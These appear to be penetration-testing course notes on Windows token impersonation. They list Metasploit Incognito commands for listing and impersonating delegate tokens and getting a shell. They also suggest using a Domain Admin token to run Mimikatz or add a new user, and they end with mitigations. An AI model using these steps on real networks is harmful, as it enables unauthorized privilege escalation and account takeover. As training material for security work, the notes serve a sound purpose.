Tokens are temp keys that allow access to a system/network without having to provide credentials, like cookies for computers

Two types:
	Delegate - created for logging into a machine or using Remote Desktop
	Impersonate - 'non-interactive' such as attaching a network drive or a domain logon script

Attacking Delegate Tokens with Incognito inside Metasploit
	In Metasploit if you can pop a shell and get the `meterpreter >` prompt, you can `load incognito` and then `list_tokens -u` to have it spit out the available delegate tokens.  You then `impersonate_token pnpt\\fcastle` and then run `shell` and it should put you into a shell with the impersonated token.
	`meterpreter > load incognito`
	`meterpreter > list_tokens -u`   -u for user or -g for group
	`meterpreter > impersonate_token <domain\\token>`
	`meterpreter > shell`
	This should load you into a shell as that user

If you can get a Domain Admin token and use it, you can run tools with a higher privilege level like MimiKatz or net user /add to create a new user


Mitigation Strategies
	Limit user/group token creation permission
	Account Tiering
	Local admin restriction
